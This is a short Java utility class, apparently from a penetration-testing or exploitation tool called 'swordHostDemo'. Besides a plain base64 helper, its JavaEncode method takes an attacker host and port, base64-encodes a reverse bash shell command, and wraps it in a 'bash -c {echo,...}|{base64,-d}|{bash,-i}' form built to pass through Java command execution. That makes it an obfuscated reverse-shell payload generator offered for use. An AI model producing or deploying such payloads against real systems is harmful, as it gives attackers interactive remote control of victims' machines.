package com.swordHostDemo.utls;

import com.swordHostDemo.controller.ReverseController;

import java.io.UnsupportedEncodingException;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

/**
 * @date: 2022/12/29 20:25
 * @description:
 */
public class base64EnCode {
    public static String base64Encode(String str) {
        byte[] textByte = new byte[0];
        textByte = str.getBytes(StandardCharsets.UTF_8);
        final String encodedText = Base64.getEncoder().encodeToString(textByte);
        System.out.println(encodedText);
        return encodedText;
    }

    public static String JavaEncode(String Lhost, String Lport) {

        String base64EecodeStr = null;
        base64EecodeStr = Base64.getEncoder().encodeToString(ReverseController.ReverseBash1(Lhost, Lport).getBytes(StandardCharsets.UTF_8));
        base64EecodeStr = "bash -c {echo," + base64EecodeStr + "}|{base64,-d}|{bash,-i}";
        return base64EecodeStr;
    }
}

